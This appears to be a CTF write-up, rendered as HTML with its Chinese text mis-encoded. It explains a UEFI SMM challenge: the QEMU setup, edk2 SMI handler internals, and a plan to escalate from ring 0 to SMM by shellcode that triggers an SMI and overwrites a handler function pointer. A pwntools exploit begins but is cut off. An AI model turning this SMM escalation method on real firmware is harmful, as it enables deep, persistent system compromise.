class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">! /bin/sh</span><br><br>cp OVMF_VARS.fd OVMF_VARS_copy.fd<br><br>./qemu-system-x86_64 \<br>  -no-reboot \<br>  -machine q35,smm=on \# ä½¿ç”¨Intel Q35ä¸»æ¿ï¼Œå¼€å¯SMM<br>  -cpu max \<br>  -net none \<br>  -serial stdio \# ä¸²å£è¾“å‡ºé‡å®šå‘è‡³æ ‡å‡†è¾“å…¥è¾“å‡º<br>  -display none \<br>  -vga none \<br>  -global ICH9-LPC.disable_s3=1 \# ç¦ç”¨ICH9-LPCè®¾å¤‡çš„S3ç¡çœ çŠ¶æ€<br>  -global driver=cfi.pflash01,property=secure,value=on \<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">å¯ç”¨QEMUå†…éƒ¨çš„CFIï¼ˆCommon Flash Interfaceï¼‰æ¨¡æ‹Ÿé©±åŠ¨ï¼Œå¹¶è®¾ç½®å…¶å±æ€§ä¸ºsecure</span><br>  -drive if=pflash,format=raw,unit=0,file=OVMF_CODE.fd,readonly=on \<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">æŒ‡å®šä½¿ç”¨pflashé©±åŠ¨ï¼Œå¹¶å°†OVMF_CODE.fdæ–‡ä»¶ä½œä¸ºè™šæ‹Ÿæœºçš„å›ºä»¶æ˜ åƒï¼ˆFirmware Imageï¼‰ï¼Œè®¾ç½®ä¸ºåªè¯»</span><br>  -drive if=pflash,format=raw,unit=1,file=OVMF_VARS_copy.fd \<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">æŒ‡å®šä½¿ç”¨pflashé©±åŠ¨ï¼Œå¹¶å°†OVMF_VARS_copy.fdæ–‡ä»¶ä½œä¸ºè™šæ‹Ÿæœºçš„å˜é‡å­˜å‚¨æ˜ åƒï¼Œç”¨äºä¿å­˜è™šæ‹Ÿæœºçš„å˜é‡çŠ¶æ€</span><br>  -drive format=raw,file=fat:rw:rootfs\<br><span class="hljs-meta prompt_">  # </span><span class="language-bash">æŒ‡å®šä½¿ç”¨rawæ ¼å¼çš„é©±åŠ¨ï¼Œå¹¶å°†rootfsæ–‡ä»¶ä½œä¸ºè™šæ‹Ÿæœºçš„ç¡¬ç›˜é©±åŠ¨å™¨</span><br>  -debugcon file:debug.log\# å°†è°ƒè¯•è¾“å‡ºé‡å®šå‘åˆ°debug.logæ–‡ä»¶<br>  -global isa-debugcon.iobase=0x402# è®¾ç½®è°ƒè¯•ä¸²å£çš„I/OåŸºåœ°å€ä¸º0x402<br></code></pre></td></tr></table></figure><ul><li>CFIï¼šä¸€ç§ç”¨äºæ¨¡æ‹Ÿé—ªå­˜è®¾å¤‡çš„æ¥å£ï¼ŒCFIæ¨¡æ‹Ÿé©±åŠ¨å…è®¸å°†è™šæ‹Ÿæœºä¸­çš„ä¸€å—åŒºåŸŸæ˜ å°„ä¸ºå¯ä¾›è™šæ‹Ÿæœºè®¿é—®çš„é—ªå­˜è®¾å¤‡</li><li>-globalï¼šè®¾ç½®å…¨å±€è®¾å¤‡<ul><li>driverï¼šè®¾ç½®äº†å…¨å±€çš„driver pflashçš„é…ç½®ï¼Œè¿™é‡Œæ˜¯secure on<ul><li>ä¹‹åå¦‚æœ-driveré€‰é¡¹é€šè¿‡ifè®¾ç½®çš„æ¥å£ç±»å‹ä¸ºpflashåˆ™ä½¿ç”¨è¿™ä¸ªå…¨å±€çš„é…ç½®</li></ul></li><li>pflash01ï¼š01è¡¨ç¤ºè®¾å¤‡çš„ç´¢å¼•æˆ–ç¼–å·</li></ul></li><li>OVMF_CODE.fdï¼š<ul><li>if&#x3D;pflashï¼šä½¿ç”¨pflashæ¥å£</li><li>format&#x3D;rawï¼šé©±åŠ¨å™¨ä¸ºåŸå§‹æ ¼å¼</li><li>unit&#x3D;0ï¼šé©±åŠ¨å™¨å•å…ƒå·ä¸º0</li><li>file&#x3D;OVMF_CODE.fdï¼šæŒ‡å®šé©±åŠ¨æ˜ åƒæ–‡ä»¶</li><li>readonly&#x3D;onï¼šåªè¯»</li></ul></li><li>OVMF_VARS_copy.fdåŒä¸Š</li></ul><h3 id="kvmvapic-bin"><a href="#kvmvapic-bin" class="headerlink" title="kvmvapic.bin"></a>kvmvapic.bin</h3><p>qemuä½¿ç”¨çš„BIOS ROMï¼Œå› ä¸ºä¸æ˜¯æœ¬åœ°çš„qemuæ‰€ä»¥éœ€è¦è¿™ä¸ªæ–‡ä»¶</p><h3 id="OVMF"><a href="#OVMF" class="headerlink" title="OVMF"></a>OVMF</h3><p>éƒ¨åˆ†å†…å®¹æ¥è‡ª2023HWSçš„ppt</p><ul><li>UEFIï¼šä¸€ç§æ ‡å‡†ï¼Œç”¨æ¥å®šä¹‰æ“ä½œç³»ç»Ÿä¸ç³»ç»Ÿå›ºä»¶ä¹‹é—´çš„è½¯ä»¶ç•Œé¢ï¼Œä½œä¸ºBIOSçš„æ›¿ä»£æ–¹æ¡ˆ</li><li>EKD2ï¼šç¬¬äºŒä»£UEFIçš„å®˜æ–¹å¼€å‘åº“ï¼ŒUEFIçš„ä¸€ä»½å®ç°ä»£ç </li><li>OVMFï¼šä¸€ä¸ªå›ºä»¶ï¼Œå¯ä»¥åœ¨è™šæ‹Ÿæœºä¸Šè¿è¡Œçš„edk2åŒ…</li></ul><h3 id="rootfs"><a href="#rootfs" class="headerlink" title="rootfs"></a>rootfs</h3><p>rootfsä½œä¸ºç¡¬ç›˜é©±åŠ¨è¢«è½½å…¥</p><ul><li>startupn.nshï¼šUEFI shellçš„shellè„šæœ¬</li><li>ToyApp.efiï¼šUEFIæ¨¡å—</li></ul><h2 id="æˆ‘æ˜¯è°æˆ‘åœ¨å“ªæˆ‘è¦å¹²ä»€ä¹ˆ"><a href="#æˆ‘æ˜¯è°æˆ‘åœ¨å“ªæˆ‘è¦å¹²ä»€ä¹ˆ" class="headerlink" title="æˆ‘æ˜¯è°æˆ‘åœ¨å“ªæˆ‘è¦å¹²ä»€ä¹ˆ"></a>æˆ‘æ˜¯è°æˆ‘åœ¨å“ªæˆ‘è¦å¹²ä»€ä¹ˆ</h2><p>å…ˆæ‹ä¸€ä¸‹é¢˜ç›®å¹²äº†ä»€ä¹ˆæˆ‘ä»¬è¦å¹²ä»€ä¹ˆ</p><p>é¢˜ç›®ä¸»è¦æœ‰ä¸¤ä¸ªéƒ¨åˆ†</p><ul><li>ToySMMï¼šä¸€ä¸ªSMMæ¨¡å—</li><li>ToyAppï¼šä¸€ä¸ªefiæ¨¡å—</li></ul><h3 id="ToySMM-1"><a href="#ToySMM-1" class="headerlink" title="ToySMM"></a>ToySMM</h3><ul><li><p>è¿™æ˜¯ä¸€ä¸ªSMMæ¨¡å—ï¼ˆå·¥å…·ï¼šUEFIToolï¼‰</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/toysmm.png" class title="toysmm"></li><li><p>æ¨¡å—å…¥å£å‡½æ•°ToySMM_entry_5DB9425Eï¼ˆå·¥å…·ï¼šefiXplorerï¼‰</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/toyentry.png" class title="toyentry"><p>å¤§æ¦‚åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š</p><ul><li><p>åˆ©ç”¨EFI_SMM_BASE2_PROTOCOLçš„GetSmstLocationæœåŠ¡è·å–EFI_SMM_SYSTEM_TABLE2</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/smmbase.png" class title="smmbase"><p>è¿™ä¸ªç»“æ„ä½“ä¸»è¦æä¾›ä¸€äº›æœåŠ¡ï¼ˆç»“æ„ä½“éƒ¨åˆ†æˆå‘˜å¦‚ä¸‹ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">EFI_SMM_SYSTEM_TABLE2</span> &#123;</span><br>  <span class="hljs-comment">/// å†…å­˜æœåŠ¡ï¼Œç”³è¯·æˆ–é‡Šæ”¾SMRAM</span><br>  EFI_ALLOCATE_POOL                       SmmAllocatePool;<br>  EFI_FREE_POOL                           SmmFreePool;<br>  EFI_ALLOCATE_PAGES                      SmmAllocatePages;<br>  EFI_FREE_PAGES                          SmmFreePages;<br><br>  <span class="hljs-comment">/// ProtocolæœåŠ¡</span><br>  EFI_INSTALL_PROTOCOL_INTERFACE      SmmInstallProtocolInterface;<br>  EFI_UNINSTALL_PROTOCOL_INTERFACE    SmmUninstallProtocolInterface;<br>  EFI_HANDLE_PROTOCOL                 SmmHandleProtocol;<br>  EFI_SMM_REGISTER_PROTOCOL_NOTIFY    SmmRegisterProtocolNotify;<br>  EFI_LOCATE_HANDLE                   SmmLocateHandle;<br>  EFI_LOCATE_PROTOCOL                 SmmLocateProtocol;<br><br>  <span class="hljs-comment">/// SMIå¤„ç†å‡½æ•°</span><br>  EFI_SMM_INTERRUPT_MANAGE            SmiManage;<br>  EFI_SMM_INTERRUPT_REGISTER          SmiHandlerRegister;<br>  EFI_SMM_INTERRUPT_UNREGISTER        SmiHandlerUnRegister;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>åˆ©ç”¨EFI_SMM_ACCESS2_PROTOCOLçš„GetCapabilitiesæœåŠ¡è·å–EFI_SMRAM_DESCRIPTOR</p><ul><li>å…ˆä»¤GetCapabilitiesçš„SmramMapå‚æ•°ä¸º0è·å–size</li><li>å†ç”³è¯·å†…å­˜</li><li>å†é€šè¿‡GetCapabilitiesè·å–EFI_SMRAM_DESCRIPTOR</li><li>å†é€šè¿‡size&gt;&gt;5è·å–EFI_SMRAM_DESCRIPTORçš„ä¸ªæ•°ï¼ˆEFI_SMRAM_DESCRIPTOR32å­—èŠ‚ï¼‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  EFI_PHYSICAL_ADDRESS    PhysicalStart;<br>  EFI_PHYSICAL_ADDRESS    CpuStart;<br>  UINT64                  PhysicalSize;<br>  UINT64                  RegionState;<br>&#125; EFI_MMRAM_DESCRIPTOR;<br><br><span class="hljs-keyword">typedef</span> EFI_MMRAM_DESCRIPTOR EFI_SMRAM_DESCRIPTOR;<br></code></pre></td></tr></table></figure></li><li><p>ç„¶åæ˜¯ä¸€äº›Hobæ“ä½œï¼Œçœ‹ä¸æ‡‚ï¼ˆ</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/hob.png" class title="hob"></li><li><p>ç„¶ååˆæ˜¯ä¸€äº›çœ‹ä¸æ‡‚çš„æ“ä½œâ€¦</p><ul><li>ä¹‹åè¾“å‡ºToySMMæ¨¡å—çš„åŠ è½½åŸºå€</li><li>åˆ©ç”¨SmiHandlerRegisteræ³¨å†ŒSMM handler</li></ul><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/register.png" class title="register"></li></ul></li></ul><h3 id="ToyApp"><a href="#ToyApp" class="headerlink" title="ToyApp"></a>ToyApp</h3><p>ä»è¾“å‡ºæ¥åˆ¤æ–­ä¸€ä¸‹è¿™ä¸ªappçš„åŠŸèƒ½ï¼š</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/app.png" class title="app"><ul><li>è¾“å…¥shellcode</li><li>è¾“å…¥Doneæ‰§è¡Œshellcode</li><li>è¾“å…¥QUITé€€å‡º</li></ul><p>ToyApp.efiå…¥å£å‡½æ•°_ModuleEntryPointæ‰§è¡Œçš„å°±æ˜¯è¿™ä¸ªåŠŸèƒ½ï¼ˆåæ±‡ç¼–å®Œä¾æ‰˜ç­”è¾©ï¼‰</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/shit.png" class title="shit"><p>åŠ¨æ€åŠ è½½åœ°å€å¯ä»¥æœç´¢å­—ç¬¦ä¸²ç¡®å®šï¼ˆæ³¨æ„UTF-16LEï¼‰</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/run.png" class title="run"><h2 id="SMM"><a href="#SMM" class="headerlink" title="SMM"></a>SMM</h2><ul><li>SMMåŠŸèƒ½ï¼š<ul><li>æä¾›ä¸€å—éš”ç¦»å†…å­˜SMRAMï¼ŒåŒ…å«ä»£ç å’Œæ•°æ®</li><li>åªæœ‰SMMï¼ˆring -2ï¼‰å¯ä»¥è®¿é—®</li></ul></li><li>è¿›å…¥SMMï¼š<ul><li>å‘å‡ºSMIï¼Œå‘0xB2ç«¯å£å†™å…¥æ•°æ®å°±å¯ä»¥è§¦å‘SMI</li></ul></li></ul><h3 id="SmiHandlerRegister"><a href="#SmiHandlerRegister" class="headerlink" title="SmiHandlerRegister"></a>SmiHandlerRegister</h3><p>çœ‹ä¸€ä¸‹SmiHandlerRegisterçš„æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c">EFI_STATUS<br>EFIAPI<br><span class="hljs-title function_">SmiHandlerRegister</span> <span class="hljs-params">(</span><br><span class="hljs-params">  IN  EFI_SMM_HANDLER_ENTRY_POINT2  Handler,</span><br><span class="hljs-params">  IN  CONST EFI_GUID                *HandlerType  OPTIONAL,</span><br><span class="hljs-params">  OUT EFI_HANDLE                    *DispatchHandle</span><br><span class="hljs-params">  )</span><br>&#123;<br>  SMI_HANDLER  *SmiHandler;<br>  SMI_ENTRY    *SmiEntry;<br>  LIST_ENTRY   *List;<br><br>    <span class="hljs-comment">// 1. æ–°å»ºä¸€ä¸ªSMI_HANDLER</span><br>  <span class="hljs-keyword">if</span> ((Handler == <span class="hljs-literal">NULL</span>) || (DispatchHandle == <span class="hljs-literal">NULL</span>)) &#123;<br>    <span class="hljs-keyword">return</span> EFI_INVALID_PARAMETER;<br>  &#125;<br><br>  SmiHandler = AllocateZeroPool (<span class="hljs-keyword">sizeof</span> (SMI_HANDLER));<br>  <span class="hljs-keyword">if</span> (SmiHandler == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">return</span> EFI_OUT_OF_RESOURCES;<br>  &#125;<br><br>  SmiHandler-&gt;Signature  = SMI_HANDLER_SIGNATURE;<br>  SmiHandler-&gt;Handler    = Handler;<br>  SmiHandler-&gt;CallerAddr = (UINTN)RETURN_ADDRESS (<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 2. åˆ©ç”¨SmmCoreFindSmiEntryå°†SmiHandleræ’å…¥mSmiEntryList</span><br>  <span class="hljs-keyword">if</span> (HandlerType == <span class="hljs-literal">NULL</span>) &#123;<br>    SmiEntry = &amp;mRootSmiEntry;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, TRUE);<br>    <span class="hljs-keyword">if</span> (SmiEntry == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">return</span> EFI_OUT_OF_RESOURCES;<br>    &#125;<br>  &#125;<br><br>  List = &amp;SmiEntry-&gt;SmiHandlers;<br><br>  SmiHandler-&gt;SmiEntry = SmiEntry;<br>  InsertTailList (List, &amp;SmiHandler-&gt;Link);<br><br>    <span class="hljs-comment">// 3. è¿”å›SmiHandler</span><br>  *DispatchHandle = (EFI_HANDLE)SmiHandler;<br><br>  <span class="hljs-keyword">return</span> EFI_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>SMI_HANDLERç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMI_HANDLER_SIGNATURE  SIGNATURE_32(<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-string">&#x27;i&#x27;</span>,<span class="hljs-string">&#x27;h&#x27;</span>)</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  UINTN                           Signature;<br>  LIST_ENTRY                      Link;       <span class="hljs-comment">// Link on SMI_ENTRY.SmiHandlers</span><br>  EFI_SMM_HANDLER_ENTRY_POINT2    Handler;    <span class="hljs-comment">// The smm handler&#x27;s entry point</span><br>  UINTN                           CallerAddr; <span class="hljs-comment">// The address of caller who register the SMI handler.</span><br>  SMI_ENTRY                       *SmiEntry;<br>  VOID                            *Context;    <span class="hljs-comment">// for profile</span><br>  UINTN                           ContextSize; <span class="hljs-comment">// for profile</span><br>&#125; SMI_HANDLER;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„EFI_SMM_HANDLER_ENTRY_POINT2æ˜¯ä¸ªå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span><br><span class="hljs-title function_">EFI_STATUS</span><br><span class="hljs-params">(EFIAPI *EFI_MM_HANDLER_ENTRY_POINT)</span><span class="hljs-params">(</span><br><span class="hljs-params">  IN EFI_HANDLE  DispatchHandle,</span><br><span class="hljs-params">  IN CONST VOID  *Context         OPTIONAL,</span><br><span class="hljs-params">  IN OUT VOID    *CommBuffer      OPTIONAL,</span><br><span class="hljs-params">  IN OUT UINTN   *CommBufferSize  OPTIONAL</span><br><span class="hljs-params">  )</span>;<br><br><span class="hljs-keyword">typedef</span>  EFI_MM_HANDLER_ENTRY_POINT      EFI_SMM_HANDLER_ENTRY_POINT2;<br></code></pre></td></tr></table></figure><p>ToySMMä¸­æ³¨å†Œçš„æ˜¯ToyMainå‡½æ•°</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/registersmm.png" class title="registersmm"><h3 id="gcSmiHandlerTemplate"><a href="#gcSmiHandlerTemplate" class="headerlink" title="gcSmiHandlerTemplate"></a>gcSmiHandlerTemplate</h3><p>é€šè¿‡SMIè¿›å…¥SMMåï¼š</p><ul><li>ä¼šå°†å½“å‰çŠ¶æ€å­˜åœ¨SMBASE + 0x8000 + 0x7c00ï¼Œæ¯”å¦‚å„ä¸ªå¯„å­˜å™¨çš„å€¼</li><li>æ‰§è¡ŒSMBASE + 0x8000å¤„çš„ä»£ç </li></ul><p>SMBASE + 0x8000ä¼šè¢«åˆå§‹åŒ–ä¸ºgcSmiHandlerTemplate</p><p>å‡½æ•°è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">gcSmiHandlerTemplate<br>-&gt; SmiRendezvous<br>-&gt; BSPHandler<br>-&gt; gSmmCpuPrivate-&gt;SmmCoreEntry<br>   SmmEntryPoint<br>-&gt; SmiManage (IMAGE, GUID, CommBuffer)<br></code></pre></td></tr></table></figure><p>SmiManageä¸­æœ€åä¼šæ‰§è¡Œä¹‹å‰æ³¨å†Œçš„Handlerï¼ŒToySMMä¸­æ˜¯ToyMain</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Status             = SmiHandler-&gt;Handler (<br>                                   (EFI_HANDLE)SmiHandler,<br>                                   Context,<br>                                   CommBuffer,<br>                                   CommBufferSize<br>                                   );<br></code></pre></td></tr></table></figure><ul><li><p>SmmEntryPointå°†gSmmCorePrivate-&gt;CommunicationBufferçš„æ•°æ®ä¼ é€’ç»™äº†SmiManageï¼ŒgSmmCorePrivateæ˜¯ä¸ªå…¨å±€å˜é‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c">â€¦â€¦<br>  <br>   CommunicationBuffer = gSmmCorePrivate-&gt;CommunicationBuffer;<br>   BufferSize          = gSmmCorePrivate-&gt;BufferSize;<br>  <br>â€¦â€¦<br>  <br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>       CommunicateHeader = (EFI_SMM_COMMUNICATE_HEADER *)CommunicationBuffer;<br>       <span class="hljs-comment">// BufferSize was updated by the SafeUintnSub() call above.</span><br>       Status = SmiManage (<br>                  &amp;CommunicateHeader-&gt;HeaderGuid,<br>                  <span class="hljs-literal">NULL</span>,<br>                  CommunicateHeader-&gt;Data,<br>                  &amp;BufferSize<br>                  );<br>   â€¦â€¦<br></code></pre></td></tr></table></figure></li><li><p>SmiManageè°ƒç”¨SmmCoreFindSmiEntryé€šè¿‡HandlerTypeï¼ˆGUIDï¼‰æŸ¥æ‰¾ä¹‹å‰æ³¨å†Œçš„SmiHandlerï¼Œè°ƒç”¨Handler</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c">EFI_STATUS<br>EFIAPI<br><span class="hljs-title function_">SmiManage</span> <span class="hljs-params">(</span><br><span class="hljs-params">  IN     CONST EFI_GUID  *HandlerType,</span><br><span class="hljs-params">  IN     CONST VOID      *Context         OPTIONAL,</span><br><span class="hljs-params">  IN OUT VOID            *CommBuffer      OPTIONAL,</span><br><span class="hljs-params">  IN OUT UINTN           *CommBufferSize  OPTIONAL</span><br><span class="hljs-params">  )</span><br>&#123;<br>    â€¦â€¦<br>    <br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Non-root SMI handler</span><br>    <span class="hljs-comment">//</span><br>    SmiEntry = SmmCoreFindSmiEntry ((EFI_GUID *)HandlerType, FALSE);<br>    <br>    â€¦â€¦<br>    <br>    Status             = SmiHandler-&gt;Handler (<br>                                       (EFI_HANDLE)SmiHandler,<br>                                       Context,<br>                                       CommBuffer,<br>                                       CommBufferSize<br>                                       );<br>    <br>    â€¦â€¦<br>    <br>&#125;<br></code></pre></td></tr></table></figure></li></ul><p>gSmmCorePrivateå…¨å±€å˜é‡å®šä¹‰åœ¨PiSmmIplæ¨¡å—ï¼Œè¢«åˆå§‹åŒ–ä¸ºmSmmCorePrivateData</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">SMM_CORE_PRIVATE_DATA  *gSmmCorePrivate = &amp;mSmmCorePrivateData;<br></code></pre></td></tr></table></figure><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><ul><li><p>ToyAppå¤„äºring 0ï¼Œè¯»å–çœŸçš„flagéœ€è¦ring -2</p></li><li><p>ToyAppå·²ç»ç»™äº†æ‰§è¡Œshellcodeçš„åŠŸèƒ½ï¼Œå¯ä»¥ç›´æ¥å†™shellcodeå‘å‡ºSMIè¿›å…¥ring -2</p></li><li><p>SMIæ‰§è¡Œçš„handlerç”±mSmmCorePrivateDataå…¨å±€å˜é‡å†³å®šï¼Œå¯ä»¥é€šè¿‡shellcodeæ›´æ”¹mSmmCorePrivateData</p></li><li><p>ToySMMçš„handlerä¸­è°ƒç”¨äº†gBS-&gt;LocateProtocolï¼Œå¯ä»¥æ›´æ”¹è¿™ä¸ªå‡½æ•°æŒ‡é’ˆä¸ºPrintFlagæ¥ç»•è¿‡&amp;aaaa &#x3D;&#x3D; (int *)0x23330000 &amp;&amp; cmpString((_BYTE *)0x23330000, &amp;aaaa, 3i64)</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/change.png" class title="change"><p>è¿™é¢˜ç¬¬ä¸€æ¬¡ä¸Šçš„æ—¶å€™é™„ä»¶è¿˜æœ‰é—®é¢˜ï¼Œ&amp;aaaa !&#x3D; (int *)0x23330000 || !StringCmp(0x23330000i64, &amp;aaaa, 3i64)ï¼Œä¹</p><img src="/2024/03/19/%E5%A4%A9%E6%9E%A2ctf-wp/old.png" class title="old"></li></ul><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><p>æ¥è‡ªå‘†ç¥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br>p = process(<span class="hljs-string">&quot;./run.sh&quot;</span>, shell=<span class="hljs-literal">True</span>)<br><br>ru = <span class="hljs-keyword">lambda</span> x : p.recvuntil(x)<br>sn = <span class="hljs-keyword">lambda</span> x : p.send(x)<br>rl = <span class="hljs-keyword">lambda</span> : p.recvline()<br>sl = <span class="hljs-keyword">lambda</span> x : p.sendline(x)<br>rv = <span class="hljs-keyword">lambda</span> x : p.recv(x)<br>sa = <span class="hljs-keyword">lambda</span> a,b : p.sendafter(a,b)<br>sla = <span class="hljs-keyword">lambda</span> a,b : 